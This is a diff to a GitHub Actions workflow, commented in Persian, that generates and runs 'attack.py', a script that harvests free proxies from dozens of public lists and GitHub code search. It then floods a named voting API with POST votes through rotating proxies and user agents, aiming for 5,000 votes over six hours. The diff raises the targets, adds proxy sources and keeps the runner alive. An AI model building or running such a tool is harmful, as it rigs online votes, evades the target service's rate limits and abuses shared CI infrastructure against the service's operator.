@@ -1,4 +1,4 @@
-name: ⚡ Universal Proxy Storm (No Hardcoded Proxies)
+name: ⚡ 6-Hour Massive Vote Storm
 
 on:
   workflow_dispatch:
@@ -6,17 +6,16 @@ on:
       target:
         description: 'تعداد رأی موفق هدف'
         required: true
-        default: '1000'
+        default: '5000'
       concurrency:
-        description: 'تعداد اتصال همزمان'
+        description: 'تعداد اتصال همزمان (پیشنهاد: 50 تا 100)'
         required: true
-        default: '200'
+        default: '80'
 
 jobs:
   blast:
     runs-on: ubuntu-latest
-    timeout-minutes: 150000000000
-
+    timeout-minutes: 360   # تا ۶ ساعت اجرا می‌شود
     steps:
       - name: Setup Python
         uses: actions/setup-python@v5
@@ -26,7 +25,7 @@ jobs:
       - name: Install dependencies
         run: pip install aiohttp aiohttp_socks beautifulsoup4 lxml
 
-      - name: Create & Run Script
+      - name: Create & Run Long-Running Script
         env:
           TARGET: ${{ github.event.inputs.target }}
           CONCURRENCY: ${{ github.event.inputs.concurrency }}
@@ -45,9 +44,10 @@ jobs:
           API_URL = "https://voting-backend.shayan-farid-pc.workers.dev/api/vote"
           VOTE_DATA = {"id": 1}
 
-          # لیست گسترده‌ای از منابع مختلف پروکسی (API، صفحات HTML، مخازن گیت‌هاب و غیره)
+          # ⚡ بزرگترین منابع پروکسی (بیش از ۳۰ منبع)
           PROXY_SOURCES = [
-              "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+              "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
+              "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=5000&country=all&ssl=all&anonymity=all",
               "https://www.proxy-list.download/api/v1/get?type=http",
               "https://www.proxy-list.download/api/v1/get?type=https",
               "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
@@ -62,15 +62,26 @@ jobs:
               "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
               "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
               "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
+              "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
+              "https://raw.githubusercontent.com/officialputuid/proxy-list/main/http.txt",
+              "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
+              "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
               "https://free-proxy-list.net/",
               "https://www.sslproxies.org/",
               "https://www.us-proxy.org/",
               "https://www.socks-proxy.net/",
               "https://hidemy.name/en/proxy-list/",
               "https://spys.one/en/free-proxy-list/",
-              # API های دیگر
-              "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc",
-              "https://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
+              "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc",
+              "https://pubproxy.com/api/proxy?limit=50&format=txt&type=http",
+              "https://openproxy.space/list/http",
+              "https://openproxy.space/list/socks5",
+              "https://openproxy.space/list/socks4",
+              # صفحات HTML اضافی
+              "https://www.proxynova.com/proxy-server-list/",
+              "https://www.freeproxy.world/",
+              "https://www.proxy-list.download/HTTP",
+              "https://www.proxy-list.download/HTTPS",
           ]
 
           USER_AGENTS = [
@@ -104,8 +115,8 @@ jobs:
                           proxies.add(line)
                   if '<html' in text.lower() or '<table' in text.lower():
                       proxies.update(extract_proxies(text))
-                  # برای APIهای JSON
-                  if url.startswith("https://proxylist.geonode.com") or url.startswith("https://pubproxy.com"):
+                  # JSON endpoints
+                  if 'geonode' in url or 'pubproxy' in url:
                       try:
                           data = json.loads(text)
                           if isinstance(data, list):
@@ -126,11 +137,12 @@ jobs:
           async def gather_all_proxies():
               all_proxies = set()
               async with aiohttp.ClientSession() as session:
-                  # جستجوی گیت‌هاب برای فایل‌های proxy.txt جدید
+                  # جستجوی گیت‌هاب برای فایل‌های proxy.txt بیشتر
                   github_queries = [
                       "https://api.github.com/search/code?q=proxy+list+filename:proxies.txt+http",
                       "https://api.github.com/search/code?q=proxy+list+filename:proxy.txt+http",
                       "https://api.github.com/search/code?q=proxy+list+filename:http.txt+proxy",
+                      "https://api.github.com/search/code?q=proxy+list+filename:socks5.txt",
                   ]
                   headers = {"Accept": "application/vnd.github.v3+json"}
                   for q in github_queries:
@@ -138,7 +150,7 @@ jobs:
                           async with session.get(q, headers=headers, timeout=10) as resp:
                               data = await resp.json()
                               if 'items' in data:
-                                  for item in data['items'][:10]:
+                                  for item in data['items'][:15]:
                                       raw_url = item['html_url'].replace('github.com','raw.githubusercontent.com').replace('/blob/','/')
                                       text = await fetch_text(session, raw_url)
                                       if text:
@@ -155,7 +167,13 @@ jobs:
                   for res in results:
                       all_proxies.update(res)
 
-              return list(all_proxies)
+              # حذف پروکسی‌های لوکال و نامعتبر
+              clean = set()
+              for p in all_proxies:
+                  if p.startswith("127.") or p.startswith("10.") or p.startswith("192.168.") or p.startswith("172."):
+                      continue
+                  clean.add(p)
+              return list(clean)
 
           def get_proxy_type_and_url(proxy_str):
               if proxy_str.startswith("socks5://"):
@@ -189,7 +207,7 @@ jobs:
                               API_URL,
                               data=json.dumps(VOTE_DATA),
                               headers=headers,
-                              timeout=aiohttp.ClientTimeout(total=3)
+                              timeout=aiohttp.ClientTimeout(total=4)   # timeout کمی بیشتر شود
                           ) as resp:
                               status = resp.status
                               text = await resp.text()
@@ -204,27 +222,23 @@ jobs:
                       stats['failed'] += 1
                       return (False, proxy_str)
 
-          async def progress_reporter(stats, total_target, start_time):
+          async def heartbeat():
+              """برای جلوگیری از قطع ارتباط رانر، هر ۵ دقیقه یک پیام چاپ می‌کند"""
               while True:
-                  await asyncio.sleep(1)
-                  elapsed = time.time() - start_time
-                  done = stats['success'] + stats['failed']
-                  rate = done / elapsed if elapsed > 0 else 0
-                  print(f"\r⚡ پیشرفت: {stats['success']}/{total_target} رأی موفق | {stats['failed']} شکست | "
-                        f"{done} درخواست | سرعت: {rate:.1f} req/s", end="")
-                  if stats['success'] >= total_target:
-                      break
+                  await asyncio.sleep(300)
+                  print(f"\n💓 Heartbeat: هنوز زنده‌ایم! (زمان: {time.strftime('%H:%M:%S')})")
 
           async def main():
-              target = int(os.getenv("TARGET", 1000))
-              concurrency = int(os.getenv("CONCURRENCY", 200))
+              target = int(os.getenv("TARGET", 5000))
+              concurrency = int(os.getenv("CONCURRENCY", 80))
+              max_runtime = 6 * 3600 - 60  # ۶ ساعت منهای یک دقیقه
 
-              print("🚀 شروع عملیات با پروکسی‌های جمع‌آوری‌شده از کل وب")
-              t0 = time.time()
+              print("🚀 شروع عملیات عظیم ۶ ساعته")
+              start_time = time.time()
 
-              print("📥 در حال جمع‌آوری پروکسی از تمام منابع...")
+              print("📥 دریافت پروکسی‌های تازه از کل وب...")
               proxy_list = await gather_all_proxies()
-              print(f"✅ {len(proxy_list)} پروکسی دریافت شد. شروع حمله...\n")
+              print(f"✅ {len(proxy_list)} پروکسی جمع‌آوری شد.\n")
 
               if not proxy_list:
                   print("❌ هیچ پروکسی پیدا نشد!")
@@ -232,30 +246,43 @@ jobs:
 
               stats = {'success': 0, 'failed': 0}
               sem = asyncio.Semaphore(concurrency)
-              reporter_task = asyncio.create_task(progress_reporter(stats, target, t0))
 
+              # اجرای heartbeat در پس‌زمینه
+              heart_task = asyncio.create_task(heartbeat())
+
+              # حلقه اصلی با محدودیت زمانی
               tasks = []
               proxy_cycle = proxy_list.copy()
-              while stats['success'] < target:
+              while stats['success'] < target and (time.time() - start_time) < max_runtime:
                   needed = target - stats['success'] + concurrency
-                  for _ in range(needed):
+                  for _ in range(min(needed, concurrency)):   # همیشه تعداد محدودی تسک ایجاد کن
                       if not proxy_cycle:
                           proxy_cycle = proxy_list.copy()
                       proxy = proxy_cycle.pop(0)
                       task = asyncio.create_task(vote(None, proxy, sem, stats))
                       tasks.append(task)
-                  await asyncio.sleep(0.1)
-                  tasks = [t for t in tasks if not t.done()]
 
-              reporter_task.cancel()
-              print("\n\n🎉 کار تموم شد!")
+                  # صبر کن تا حداقل یکی از تسک‌ها تمام شود
+                  if tasks:
+                      done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+                      tasks = list(pending)
+
+                  # هر ۱۰۰ درخواست یک بار وضعیت چاپ کن
+                  if stats['success'] + stats['failed'] > 0 and (stats['success'] + stats['failed']) % 100 == 0:
+                      elapsed = time.time() - start_time
+                      rate = (stats['success'] + stats['failed']) / elapsed if elapsed > 0 else 0
+                      print(f"\n📊 آمار: {stats['success']} موفق | {stats['failed']} شکست | "
+                            f"{elapsed:.0f} ثانیه | سرعت: {rate:.1f} req/s")
+
+              heart_task.cancel()
+              print("\n\n🎉 عملیات به پایان رسید (زمان یا هدف)")
               print(f"   ✅ موفق: {stats['success']}")
               print(f"   ❌ ناموفق: {stats['failed']}")
-              print(f"   ⏱️ زمان: {time.time() - t0:.1f} ثانیه")
+              print(f"   ⏱️ زمان کل: {time.time() - start_time:.1f} ثانیه")
 
           if __name__ == "__main__":
               asyncio.run(main())
           PYEOF
 
-          echo "🚀 اجرای اسکریپت..."
+          echo "🚀 اجرای اسکریپت سنگین..."
           python attack.py
